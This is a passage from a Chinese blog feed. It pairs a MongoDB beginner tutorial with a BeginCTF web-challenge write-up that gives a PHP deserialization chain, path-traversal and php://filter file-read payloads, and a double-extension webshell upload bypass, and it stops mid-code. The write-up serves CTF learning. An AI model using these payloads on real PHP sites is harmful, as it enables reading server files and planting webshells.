    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB初体验</title>
    <link href="http://example.com/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2024-02-01T15:53:50.000Z</published>
    <updated>2024-02-01T16:49:08.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装MongoDB"><a href="#安装MongoDB" class="headerlink" title="安装MongoDB"></a>安装MongoDB</h1><p>MongoDB server:<a href="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p><p>客户端mongo shell:<a href="https://www.mongodb.com/try/download/shell">https://www.mongodb.com/try/download/shell</a></p><p>安装环境: Ubuntu 22.04</p><h2 id="mongo-server"><a href="#mongo-server" class="headerlink" title="mongo server"></a>mongo server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i mongodb-org-server_7.0.5_amd64.deb</span><br></pre></td></tr></table></figure><p>启动:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mongod.service</span><br></pre></td></tr></table></figure><h2 id="mongo-shell"><a href="#mongo-shell" class="headerlink" title="mongo shell"></a>mongo shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf mongosh-x.x.x-linux-x64.tgz</span><br></pre></td></tr></table></figure><p>在<code>mongosh-x.x.x-linux-x64/bin</code>目录下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> mongosh /usr/local/bin/</span><br><span class="line">sudo <span class="built_in">cp</span> mongosh_crypt_v1.so /usr/local/lib/</span><br></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongosh --host 127.0.0.1 --port 27017</span><br></pre></td></tr></table></figure><h1 id="与传统的mysql类比"><a href="#与传统的mysql类比" class="headerlink" title="与传统的mysql类比"></a>与传统的mysql类比</h1><table><thead><tr><th>SQL 概念</th><th>MongoDB 概念</th><th>说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表&#x2F;集合</td></tr><tr><td>row</td><td>document</td><td>数据记录行&#x2F;文档</td></tr><tr><td>column</td><td>field</td><td>数据字段&#x2F;域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>table joins</td><td></td><td>表连接，MongoDB 不支持</td></tr><tr><td>primary key</td><td>primary key</td><td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td></tr></tbody></table><p>MongoDB 将数据存储为一个文档，数据结构由键值（key&#x3D;&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : 19,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>我们使用use users来转到users数据库,如果没有, 将会__自动创建一个__,即使用use users来创建一个数据库</p><p>查看所有数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202001642138.png" alt="image-20240202001642138"></p><p>并没有出现users,因为需要先插入数据</p><h3 id="添加一个集合"><a href="#添加一个集合" class="headerlink" title="添加一个集合"></a>添加一个集合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.createCollection(&quot;all_users&quot;)</span><br></pre></td></tr></table></figure><h3 id="向集合中插入一个文档"><a href="#向集合中插入一个文档" class="headerlink" title="向集合中插入一个文档"></a>向集合中插入一个文档</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.insert(&#123;name: <span class="string">&#x27;whoami&#x27;</span>, </span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">19</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [<span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="更新文档内容"><a href="#更新文档内容" class="headerlink" title="更新文档内容"></a>更新文档内容</h3><h4 id="update-方法"><a href="#update-方法" class="headerlink" title="update()方法"></a>update()方法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.update(&#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">19</span> &#125;, &#123; $<span class="keyword">set</span>: &#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span> &#125; &#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202002705382.png" alt="image-20240202002705382"></p><p>此时文档内容已经更新了</p><h4 id="save-方法"><a href="#save-方法" class="headerlink" title="save()方法"></a>save()方法</h4><p>save() 方法通过传入的文档来替换已有文档，<code>_id</code> 主键存在就更新，不存在就插入.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.save(&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">21</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br><span class="line">query：可选，使用查询操作符指定查询条件，相当于 <span class="keyword">sql</span> <span class="keyword">select</span> 语句中的 <span class="keyword">where</span> 子句。</span><br><span class="line">projection：可选，使用投影操作符指定返回的键。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="number">20</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="MongoDB-与-RDBMS-Where-语句的比较"><a href="#MongoDB-与-RDBMS-Where-语句的比较" class="headerlink" title="MongoDB 与 RDBMS Where 语句的比较"></a>MongoDB 与 RDBMS Where 语句的比较</h3><p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p><table><thead><tr><th>操作</th><th>格式</th><th>范例</th><th>RDBMS 中的类似语句</th></tr></thead><tbody><tr><td>等于</td><td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td><td><code>where name = &#39;whoami&#39;</code></td></tr><tr><td>小于</td><td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td><td><code>where age &lt; 19</code></td></tr><tr><td>小于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td><td><code>where likes &lt;= 19</code></td></tr><tr><td>大于</td><td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt; 19</code></td></tr><tr><td>大于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt;= 19</code></td></tr><tr><td>不等于</td><td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td><td><code>where likes != 19</code></td></tr></tbody></table><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>在MongDB中 逗号就相当于AND</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:<span class="number">20</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202003723359.png" alt="image-20240202003723359"></p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.col.find(</span><br><span class="line">   &#123;</span><br><span class="line">      $<span class="keyword">or</span>: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(</span><br><span class="line">&#123;</span><br><span class="line">$<span class="keyword">or</span>: [</span><br><span class="line">&#123;&quot;age&quot;:<span class="number">20</span>&#125;, &#123;&quot;status&quot;:&quot;B&quot;&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AND与OR联合"><a href="#AND与OR联合" class="headerlink" title="AND与OR联合"></a>AND与OR联合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:<span class="number">19</span>&#125;, $<span class="keyword">or</span>: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)</span><br></pre></td></tr></table></figure><p>这相当于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> age <span class="operator">&gt;</span> <span class="number">19</span> <span class="keyword">AND</span> (name<span class="operator">=</span><span class="string">&#x27;whoami&#x27;</span> <span class="keyword">OR</span> status<span class="operator">=</span><span class="string">&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装MongoDB&quot;&gt;&lt;a href=&quot;#安装MongoDB&quot; class=&quot;headerlink&quot; title=&quot;安装MongoDB&quot;&gt;&lt;/a&gt;安装MongoDB&lt;/h1&gt;&lt;p&gt;MongoDB server:&lt;a href=&quot;https://www.mongod</summary>
      
    
    
    
    
    <category term="MongoDB" scheme="http://example.com/tags/MongoDB/"/>
    
    <category term="nosql注入" scheme="http://example.com/tags/nosql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BeginCTF（自由赛道）</title>
    <link href="http://example.com/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/"/>
    <id>http://example.com/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/</id>
    <published>2024-01-31T14:23:01.000Z</published>
    <updated>2024-02-06T08:19:14.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BeginCTF（自由赛道）"><a href="#BeginCTF（自由赛道）" class="headerlink" title="BeginCTF（自由赛道）"></a>BeginCTF（自由赛道）</h1><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;p = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比较简单</p><p>需要注意的是类<code>B</code>下面是没有a属性的,但是不影响解题(由于php特性,反序列化后会自动添加类中不存在而序列中存在的属性)</p><h2 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h2><p>直接上payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=../../../../flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h2><p>源码中禁止出现<code>..</code>和<code>/</code></p><p>我们用伪协议读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=php://filter/read/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察附件中的源码,容易发现以下地方存在漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br></pre></td></tr></table></figure><p>只需要构造一个文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.zip.php</span><br></pre></td></tr></table></figure><p>经处理后得到的<code>$file_ext</code>值为’zip’,但是此文件名将会被解析为php</p><p>注: 前端不允许.php结尾,只需要将.zip后缀的文件代理到burpsuite之后改为.zip.php即可</p><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span 